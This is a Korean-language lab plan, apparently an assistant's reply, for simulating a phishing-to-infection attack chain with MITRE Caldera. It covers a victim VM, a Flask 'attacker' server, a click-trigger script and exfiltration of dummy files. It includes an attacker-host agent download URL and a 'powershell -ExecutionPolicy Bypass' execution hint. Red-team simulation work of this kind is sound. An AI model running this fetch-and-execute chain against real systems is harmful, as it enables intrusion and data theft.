# [KISA TTPs 4번 기본 방식 vs 우리가 구현하는 방식 비교표]

| 단계                                | KISA TTPs 4번: 실제 공격 방식(기본)                                 | 우리가 구현하는 단순화 시나리오                                           |
| --------------------------------- | ---------------------------------------------------------- | ----------------------------------------------------------- |
| **1. 정찰**                         | 검색엔진·SNS·기업 사이트를 통해 조직정보, 직원 이메일 패턴, 로그인 페이지, MFA 여부 등을 수집 | IIS 기반 타깃 웹사이트 구축 → Agent가 GET/POST 요청으로 이메일 패턴 추출 + MFA 판별 |
| **정찰 도구**                         | 브라우저, OSINT 툴, 내부 계정 활용 등 다양                               | Caldera Agent의 HTTP ability + 정규식 파싱                        |
| **2. 피싱 타깃 식별**                   | 수집된 이메일 중 공격 난이도/가치가 높은 계정 우선 선정                           | contact.html에서 추출한 이메일 하나를 자동 선택                            |
| **3. 자원 개발(도메인·서버 구축)**           | 신규 도메인 구매, VPS 임대, 웹서버 세팅                                  | 공격자 서버 1대로 단순화(PHP 또는 Python Flask)                         |
| **4. 피싱 페이지 제작**                  | 실제 기업 로그인 페이지와 유사한 피싱 웹페이지 제작                              | login.html을 모방한 간단한 템플릿 자동 생성                               |
| **5. 피싱 메일 구성**                   | 제목, 본문, URL, 악성 첨부파일 등 고도화된 피싱 메일 작성                       | 피싱 메일 내용(txt) 자동 생성. 메일 서버는 생략                              |
| **6. 피싱 메일 전달**                   | SMTP 서버/실제 이메일 계정 통해 발송                                    | Python 클릭 트리거 스크립트가 “사용자 클릭”을 자동 시뮬레이션                      |
| **7. 사용자가 링크 클릭**                 | 사람이 피싱 URL 클릭 → 브라우저에서 악성 자원 실행                            | Python 스크립트가 자동으로 피싱 URL 요청(GET/POST)                       |
| **8. 악성코드 다운로드**                  | 악성 파일(DOC, EXE, ZIP) 다운로드 및 실행                             | 공격자 서버가 JSON으로 agent 다운로드 URL 제공                            |
| **9. 악성코드 실행(Initial Execution)** | 다운로드된 악성코드가 자동 실행되어 내부 감염                                  | Python이 Sandcat agent 또는 ps1 스크립트 자동 실행                     |
| **10. 초기 제어 확보**                  | C2 서버 연결, 명령 실행                                            | Caldera 서버에 agent 자동 등록                                     |
| **11. 지속성 확보(Persistence)**       | 레지스트리·서비스 등록·스케줄러 등록                                       | 필요 시 run 키 또는 startup 폴더 활용. 실험 단순화를 위해 옵션 처리               |
| **12. 자격증명 수집**                   | 키로깅, 브라우저 비밀번호, 패스워드 덤프 등                                  | Chrome에 저장된 가짜 계정 또는 샘플 credential 파일 활용                    |
| **13. 내부 확산(Lateral Movement)**   | SMB 스캐닝, RDP, 피싱 재전송 등으로 다른 PC 감염                          | 스킵 (실험 범위 밖)                                                |
| **14. 내부 정보 수집**                  | 스크린샷, 키로깅, 파일 탐색 등 다양한 기능                                  | 파일 목록 수집 + 더미 파일 선정                                         |
| **15. 데이터 유출**                    | 대용량 파일 분할 전송, 암호화 후 업로드                                    | 더미 파일 zip 압축 후 Caldera 서버로 업로드                              |
| **16. 전체 공격 시나리오 특징**             | 다단계·고도화된 공격 체인. 높은 난이도                                     | 초기 공격(정찰→자원개발→클릭→초기실행)에 집중한 단순화 모델                          |
| **일치율**                           | 100% 기준                                                    | 전체 약 60~65%, 핵심 영역(정찰·자원 개발) 약 80% 이상                       |

---

좋아. 이제 **본격적으로 환경 설정(Environment Setup)**을 시작하는 타이밍이 맞다.
그런데 단순히 “윈도우 하나 만들고 IIS 설치” 수준이 아니라,
**전체 시나리오가 매끄럽게 돌아가도록 설계된 전체 환경 구성**이 필요하다.

지금까지 정리한 공격 흐름을 기준으로,
너가 해야 할 환경 설정을 **가장 효율적인 순서**로 정리해줄게.

---

# ⭐ TTPS4 시뮬레이션을 위한 최종 환경 구성 로드맵

이 로드맵대로 준비하면 전체 시나리오가 자연스럽게 흘러간다.

---

# 1. 피해자 PC(Victim) 환경 설정

목적:

* 피싱 타깃 역할
* IIS 웹사이트 호스팅
* Python 클릭 트리거 실행
* Caldera Agent 존재

## ⭕ 필요한 것

1. **Windows 10/11 VM** 하나
2. **IIS 설치**
3. **웹사이트 배포**

   * index.html
   * contact.html
   * login.html
   * reset_password.asp
4. **Python 설치 (3.10~3.12)**
5. **click_trigger.py 배치**
6. **Caldera Agent(Sandcat exe or ps1) 사전 설치**
   *→ 자동 감염 시나리오를 위해선 “agent 실행만 하면 되는 상태”로 준비*

## ⭕ 네트워크 구성

* 공격자 서버와 통신 가능
* 외부 인터넷은 옵션
* 호스트 전용(host-only) 또는 NAT 모두 OK

---

# 2. 공격자 서버(Attacker) 환경 설정

목적:

* 피싱 URL 응답 제공
* Agent 다운로드 링크 제공
* Python 클릭 트리거와 상호작용
* Caldera 서버와 특징 구분됨

## 옵션 1: Windows/Kali + XAMPP/PHP

## 옵션 2: Ubuntu/Kali + Flask API

둘 다 가능하지만 Flask가 잘 어울림.

### ⭕ 필요한 기능

1. `login.php` 또는 `login_api.py`

   * Python 클릭 트리거가 여기로 POST/GET 전송
   * “악성 다운로드 URL” JSON 형태로 반환
2. agent 파일을 static 경로에 올려두기
3. 공격자 서버는 Caldera 서버와 네트워크 분리 여부 상관 없음

예:

```
http://attacker/login
http://attacker/agents/sandcat.ps1
```

---

# 3. Caldera 서버 환경 설정

목적:

* 공격자 Agent(Operator) 운영
* 피해자 Agent 연결
* 정찰·자원개발 ability 실행
* operation 관리

## ⭕ 필요한 것

1. Caldera 5.x 설치
2. sandcat plugin 활성화
3. stockpile plugin 활성화
4. ability 작성 경로 준비

   * `data/abilities/...`
5. operation template 생성

---

# 4. Python 클릭 트리거(click_trigger.py) 설정

이 파일은 피해자 PC에서 다음을 수행한다.

1. 사용자가 피싱 링크를 클릭한 것처럼 공격자 서버 URL 요청
2. 공격자가 반환한 JSON을 파싱
3. Sandcat agent 다운로드
4. 다운로드된 agent 실행

즉, **피싱 → 감염 → agent 실행**이 모두 자동화됨.

---

# 5. 더미 파일(유출용 데이터) 생성

피해자 PC에서:

* Documents 폴더 등지에 10개 정도
* 다양한 크기(1MB~10MB)
* 자동 생성 스크립트 실행

예(파워쉘):

```
1..10 | % { fsutil file createnew "C:\VictimData\file$_.bin" 5000000 }
```

→ 이후 Caldera ability에서 파일 수집 및 유출 시험.

---

# 6. 정찰 Ability 개발

공격자 Agent가 수행하는 정찰 TTP:

1. GET /index.html
2. GET /contact.html → 이메일 regex 추출
3. GET /login.html
4. POST /reset_password.asp → MFA 여부 판단
5. 추출한 정보를 fact로 저장

이 ability들은 Caldera의 **single command ability**로 쉽게 작성 가능.

---

# 7. 자원 개발 Ability 개발

개발해야 할 ability:

1. Base64 인코딩 ability
2. 피싱 URL 생성 ability
3. 피싱 페이지 템플릿 생성 ability
4. 피싱 메일 텍스트 생성 ability

→ M2 단계(자원 개발) 완성.

---

# 8. 초기 실행 및 유출 ability 개발

피해자 Agent가 수행:

1. whoami / hostname
2. 파일 목록 탐색
3. zip 압축
4. Caldera upload endpoint로 전송
5. 결과 fact 저장

---

# ⭐ 전체 환경 흐름(요약)

```
[공격자 Agent]  ─── GET/POST → [피해자 IIS 서버]
      │
      ├─ 이메일 패턴 수집
      ├─ MFA 여부 확인
      │
      └→ 자원개발(Base64/URL/템플릿)

[피해자 PC]
   python click_trigger.py 실행
       ↓
   공격자 서버에 접속(login)
       ↓
   agent 다운로드 + 실행
       ↓
   Caldera 서버에 연결

[Caldera 서버]
   운영자가 시나리오 실행
   ├─ 정찰 ability
   ├─ 자원개발 ability
   ├─ 초기 실행 ability
   └─ 유출 ability
```

---

# ⭐ 지금 해야 할 실제 행동 순서 (실무 체크리스트)

### 1) 피해자 PC 준비

* Windows VM 생성
* IIS 설치
* 웹파일 4개 넣기
* Python 설치
* Caldera agent 사전 설치

### 2) 공격자 서버 준비

* Flask or PHP API 생성
* agent 파일을 static 경로에 올리기

### 3) click_trigger.py 작성 및 테스트

* POST 요청 → JSON 응답 확인
* agent 다운로드 기능 테스트
* agent 자동 실행 확인

### 4) Caldera 서버 준비

* agent 등록 확인
* ability 폴더 세팅

### 5) 데이터 파일 생성

* 유출 실험용 더미 파일 생성

### 6) ability 개발

* 정찰
* 자원 개발
* 초기 실행
* 유출

### 7) 전체 흐름 테스트

* click_trigger.py → agent 실행 → Caldera operation 수행

---

# ⭐ 0. 사전 조건

Ubuntu 20.04 ~ 24.04 기준
Python 3.10+ 권장
Caldera Sandcat agent 파일을 공격자 서버에 업로드할 준비 필요

경로 예시:

```
~/attacker_server/
    ├── server.py         (Flask app)
    ├── agents/
    │     ├── sandcat.ps1
    │     └── sandcat.exe
    └── logs/
```

---

# ⭐ 1. 필수 패키지 설치

```bash
sudo apt update
sudo apt install python3 python3-pip -y
pip3 install flask flask_cors
```

옵션(CORS는 나중에 피해자 PC에서 AJAX로 호출 가능하게 하기 위함)

---

# ⭐ 2. 플라스크 기본 구조 만들기

경로 생성:

```bash
sudo mkdir -p ~/attacker_server/agents
sudo mkdir -p ~/attacker_server/logs
cd ~/attacker_server
```

Sandcat agent 파일 생성:

```
nano ~/attacker_server/agents/sandcat.ps1
```
---

# ⭐ 3. Flask 서버 핵심 코드(server.py)

아래는 **피싱 클릭 → 악성 다운로드 경로 반환** 기능을 포함한
시험용 완전 작동 Flask API다.


---

# ⭐ 4. 서버 실행

```bash
cd ~/attacker_server
python3 server.py
```

실행 후브라우저에서:

```
http://192.168.56.1:34444
```

문구:

```
Attacker Server Running
```

---

# ⭐ 5. 피해자 PC에서 요청 테스트

피해자 PC(Windows) PowerShell에서:

```powershell
Invoke-RestMethod -Uri "http://192.168.56.1:34444/login?user=victim@example.com"
```

기대 결과(JSON):

```json
{
  "status": "ok",
  "message": "Phishing click registered.",
  "download_url": "http://192.168.56.1:34444/agents/sandcat.ps1",
  "execute_hint": "powershell -ExecutionPolicy Bypass -File sandcat.ps1"
}
```

---
